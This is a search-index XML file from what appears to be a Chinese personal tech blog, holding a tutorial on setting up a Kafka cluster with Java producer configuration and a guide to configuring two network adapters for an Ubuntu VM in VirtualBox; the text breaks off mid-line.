<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>机器学习：人脸识别-KNN</title>
      <link href="/2021/12/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB-KNN/"/>
      <url>/2021/12/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB-KNN/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kafka：集群</title>
      <link href="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/"/>
      <url>/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="1-创建集群"><a href="#1-创建集群" class="headerlink" title="1.创建集群"></a>1.创建集群</h1><h4 id="1-先复制properties文件"><a href="#1-先复制properties文件" class="headerlink" title="1.先复制properties文件"></a>1.先复制properties文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server.properties </span><br><span class="line">cp server.properties server1.properties </span><br><span class="line">cp server.properties server2.properties </span><br><span class="line">cp server.properties server3.properties </span><br></pre></td></tr></table></figure><p>每台kafka节点需要一份配置文件</p><h4 id="2-修改其中的配置"><a href="#2-修改其中的配置" class="headerlink" title="2.修改其中的配置"></a>2.修改其中的配置</h4><ul><li>broker.id</li><li>ip+端口号</li><li>日志文件夹</li></ul><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226081954073.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226081954073.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226081954073"></p><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082007147.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082007147.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226082007147"></p><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082017295.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082017295.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226082017295"></p><h4 id="3-启动服务"><a href="#3-启动服务" class="headerlink" title="3.启动服务"></a>3.启动服务</h4><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082049553.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082049553.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226082049553" style="zoom:200%;"><h4 id="4-查看是否启动成功"><a href="#4-查看是否启动成功" class="headerlink" title="4.查看是否启动成功"></a>4.查看是否启动成功</h4><p>进入zk中查看/broker/ids下面的节点是否是刚才添加的id</p><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082924934.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226082924934.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226082924934"></p><h1 id="2-创建副本"><a href="#2-创建副本" class="headerlink" title="2.创建副本"></a>2.创建副本</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建副本</span></span><br><span class="line">./kafka-topics.sh --create --zookeeper 192.168.100.10:2181 --replication-factor 3 --partitions 2 --topic my-replicated-topic</span><br><span class="line"><span class="meta">#</span><span class="bash">查看话题详细信息</span></span><br><span class="line">./kafka-topics.sh --describe --zookeeper 192.168.100.10:2181 --topic my-replicated-topic</span><br></pre></td></tr></table></figure><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226084110711.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226084110711.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226084110711"></p><p>副本其实就是一个备份，而且只有leader副本负责写，其他副本负责同步，每个分区有自己的副本</p><p>生产者和消费者都是直接往leader副本去产生和消费消息</p><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226084202570.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226084202570.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226084202570"></p><p><strong>leader</strong>读和写的操作，都发生在leader上。leader负责把数据同步给follower。当leader挂了，经过主从选举，从多个follower中选举产生一个新的leader<br><strong>follower</strong>接受leader的同步数据<br><strong>isr</strong>可以同步和已经同步的节点会被存入到isr集合中</p><p><strong>集群中有多个broker，创建主题时可以指明有多个分区（消息被拆分到不痛的分区中存储），可以为分区创建多个副本，不同的副本存放在不同的broker里。</strong></p><h1 id="3-集群消息的产生与消费"><a href="#3-集群消息的产生与消费" class="headerlink" title="3.集群消息的产生与消费"></a>3.集群消息的产生与消费</h1><h4 id="1-产生"><a href="#1-产生" class="headerlink" title="1).产生"></a>1).产生</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-producer.sh --broker-list 192.168.100.20:9092,192.168.100.20:9093,192.168.100.20:9094 --topic my-replicated-topic</span><br></pre></td></tr></table></figure><h4 id="2-消费"><a href="#2-消费" class="headerlink" title="2).消费"></a>2).消费</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092,192.168.100.20:9093,192.168.100.20:9094 --from-beginning --topic my-replicated-topic</span><br></pre></td></tr></table></figure><p>上面的是没有指明消费组，这种情况下都能收到消息</p><h4 id="3-消费组消费"><a href="#3-消费组消费" class="headerlink" title="3).消费组消费"></a>3).消费组消费</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 192.168.100.20:9092,192.168.100.20:9093,192.168.100.20:9094 --from-beginning --topic my-replicated-topic --consumer-property group.id=testGroup1</span><br></pre></td></tr></table></figure><p>上面此时指明了一个消费组id，在这种情况下与单机模式一致，只有消费组中的一个消费者能消费消息</p><h4 id="4-集群消费的细节"><a href="#4-集群消费的细节" class="headerlink" title="4).集群消费的细节"></a>4).集群消费的细节</h4><p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226090746528.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226090746528.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226090746528"></p><ul><li>图中kafka集群中有两个broker，每个broker有多个partition，一个partition只能被消费组里某一个消费者消费，从而保证消费顺序。</li><li>kafka只能在自己的patition范围内保证消息消费的<strong>局部顺序性</strong>，不能在同一个topic中的多个partition中保证总的消费顺序性</li><li>一个消费者可以消费多个patition（多个parition中的消息可以传给同一个消费者）</li><li>消费组中消费者的数量不能比一个topic中的partition数量多，否则多出来的消费者消费不到消息</li></ul><h1 id="4-Java客户端"><a href="#4-Java客户端" class="headerlink" title="4.Java客户端"></a>4.Java客户端</h1><h4 id="1-生成消息客户端"><a href="#1-生成消息客户端" class="headerlink" title="1).生成消息客户端"></a>1).生成消息客户端</h4><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProducer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String TOPIC_NAME=<span class="string">&quot;my-replicated-topic&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//一、设置配置文件</span></span><br><span class="line">        Properties properties=<span class="keyword">new</span> Properties();</span><br><span class="line">        <span class="comment">//设置集群ip</span></span><br><span class="line">        properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">&quot;192.168.100.20:9092,192.168.100.20:9093,192.168.100.20:9094&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将key值转为字节数组</span></span><br><span class="line">        properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">        <span class="comment">//将value转为字节数组</span></span><br><span class="line">        properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line">        <span class="comment">//二、new一个kafkaProducer来进行发消息的操作</span></span><br><span class="line">        Producer&lt;String,String&gt; producer=<span class="keyword">new</span> KafkaProducer&lt;String,String&gt;(properties);</span><br><span class="line">        System.out.println(properties);</span><br><span class="line">        <span class="comment">//三、产生一个Producer记录，其中mykey为发送哪个分区的标识，patition_id=hash(mykey)%allid</span></span><br><span class="line">        ProducerRecord&lt;String,String&gt; producerRecord=<span class="keyword">new</span> ProducerRecord&lt;&gt;(TOPIC_NAME,<span class="string">&quot;mykey&quot;</span>,<span class="string">&quot;myvalue&quot;</span>);</span><br><span class="line">        <span class="comment">//四、发送消息，获取元数据</span></span><br><span class="line">        RecordMetadata mymetadata=producer.send(producerRecord).get();</span><br><span class="line">        System.out.println(<span class="string">&quot;同步发送消息：&quot;</span>+mymetadata.topic()+<span class="string">&quot;，partition：&quot;</span>+mymetadata.partition()</span><br><span class="line">        +<span class="string">&quot;，offset：&quot;</span>+mymetadata.offset());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设置配置文件</li><li>new一个kafkaProducer来进行发消息的操作</li><li>产生一个Producer记录，其中mykey为发送哪个分区的标识，patition_id=hash(mykey)%allid</li><li>发送消息，获取元数据</li></ul><h4 id="2-生成消息的发送同步、异步"><a href="#2-生成消息的发送同步、异步" class="headerlink" title="2).生成消息的发送同步、异步"></a>2).生成消息的发送同步、异步</h4><ul><li><strong>异步：</strong>同步和异步发送主要区别在重载函数那，如果<code>producer.send(procerRecord,new callback())</code>多个call back回调函数，此时就是异步，不论发送成功或者失败都会调用该函数</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">producer.send(producerRecord, <span class="keyword">new</span> Callback() &#123;</span><br><span class="line">              <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(RecordMetadata recordMetadata, Exception e)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(recordMetadata!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;发送异步消息：topic:&quot;</span>+recordMetadata.topic()+<span class="string">&quot;;offset&quot;</span>+recordMetadata.offset());</span><br><span class="line">             &#125;</span><br><span class="line">        <span class="keyword">if</span>(e!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                      System.out.println(<span class="string">&quot;发送消息失败&quot;</span>+e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).get();</span><br><span class="line"><span class="comment">//异步发送消息进行阻塞  下面该例子是发送5条消息</span></span><br><span class="line">CountDownLatch countDownLatch=<span class="keyword">new</span> CountDownLatch(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">  `````</span><br><span class="line">   异步发送消息回调函数&#123;</span><br><span class="line">countDownLatch.countDown();<span class="comment">//发送一次 将该线程-1   </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">countDownLatch.await(<span class="number">10</span>, TimeUnit.SECONDS); <span class="comment">//如果没有等待唤醒就10秒继续执行下去</span></span><br></pre></td></tr></table></figure><p>​    <img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226110135787.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226110135787.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226110135787" style="zoom:50%;"></p><ul><li><p><strong>同步</strong>：同步发送消息，如果生产者发送消息没有收到ack，生产者会阻塞，阻塞到3s时间，如果还没有收到消息，会进行重试，重试的次数为3次</p><ul><li><p><strong>ACK配置</strong></p><pre><code>**ack=0,** kafka-cluster不需要任何broker收到消息，就立即返回ack给生产者，最容易丢消息，效率最高**ack=1，**多副本之间的leader已经收到消息，并把消息写入到leader本地的log中，才会返回ack给生产者，**性能和安全性是最均衡的****ack=-1/all，**里面有默认的配置min.insync.repicas=2(默认为1，推进配置大于等于2)，此时就需要leader和一个follower同步完成后，才会返回ack给生产者（此时集群中有2个broker已经完成数据的接受），此方式最安全，但是性能同时是最差的</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">properties.put(ProducerConfig.ACKS_CONFIG,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>如果没有收到ACK就进行重试，<strong>重试的配置</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重试次数</span></span><br><span class="line">properties.put(ProducerConfig.RETRIES_CONFIG,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//重试以间隔设置</span></span><br><span class="line">properties.put(ProducerConfig.RETRY_BACKOFF_MS_CONFIG,<span class="number">300</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>缓冲区配置</strong></p><img src="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226104033006.png" class="lazyload" data-srcset="/2021/12/26/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/kafka%EF%BC%9A%E9%9B%86%E7%BE%A4/image-20211226104033006.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211226104033006" style="zoom: 67%;"><p>生产者会默认创建一个消息缓冲区，用来存放要发送的消息，缓冲区是32m</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">properties.put(ProducerConfig.BUFFER_MEMORY_CONFIG,<span class="number">30000000</span>);</span><br></pre></td></tr></table></figure><p>kafka本地线程会去缓冲区一次拿16k的数据，发送broker </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">properties.put(ProducerConfig.BATCH_SIZE_CONFIG,<span class="number">1600</span>);</span><br></pre></td></tr></table></figure><p>线程此时没有16k数据，间隔10ms也会将缓冲区少于16k的数据发送broker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">properties.put(ProducerConfig.LINGER_MS_CONFIG,<span class="number">10</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VirtualBox+Ubuntu：双网卡</title>
      <link href="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/"/>
      <url>/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<p>由于第一次使用virtualbox进行映像的配置 </p><p>开发需要所以需要使用虚拟机可以被ssh连接，同时虚拟机同时需要有访问网络的需求</p><p>但是设置单个网卡就只能实现其中一种功能，所以需要手动设置一个双网卡</p><ul><li><h1 id="virtualbox配置"><a href="#virtualbox配置" class="headerlink" title="virtualbox配置"></a>virtualbox配置</h1><p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203209633.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203209633.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203209633" style="zoom:50%;"><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203219356.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203219356.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203219356" style="zoom:50%;"></p></li></ul><p>我这里是开启了DHCP，后面克隆的机器的话可以不用设置网卡，也可以选择自己手动配置静态网卡</p><ul><li><h1 id="ubuntu-虚拟机配置"><a href="#ubuntu-虚拟机配置" class="headerlink" title="ubuntu 虚拟机配置"></a>ubuntu 虚拟机配置</h1><ul><li>第一张网卡：设置刚才上面配置的本地网卡，主要是用来给宿主机进行SSH连接</li></ul><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203329077.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203329077.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203329077" style="zoom:50%;"><ul><li><p>第二张网卡，设置虚拟机能上网</p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203522044.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203522044.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203522044" style="zoom:50%;"></li></ul></li></ul><ul><li><h1 id="最后Ubuntu配置"><a href="#最后Ubuntu配置" class="headerlink" title="最后Ubuntu配置"></a>最后Ubuntu配置</h1><p>通过<code>ip addr</code></p><p>可以查看到三张网卡，其中lo是系统自带的</p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203718529.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203718529.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203718529" style="zoom:50%;"><p><code>cd /etc/network  </code>然后<code>vim interfaces</code></p><img src="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203841484.png" class="lazyload" data-srcset="/2021/12/24/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/VirtualBox-Ubuntu%EF%BC%9A%E5%8F%8C%E7%BD%91%E5%8D%A1/image-20211224203841484.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211224203841484" style="zoom:67%;"><p>可以这样像我一样由dhcp来分配ip  或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto enp0s3</span><br><span class="line">iface enp0s3 inet static</span><br><span 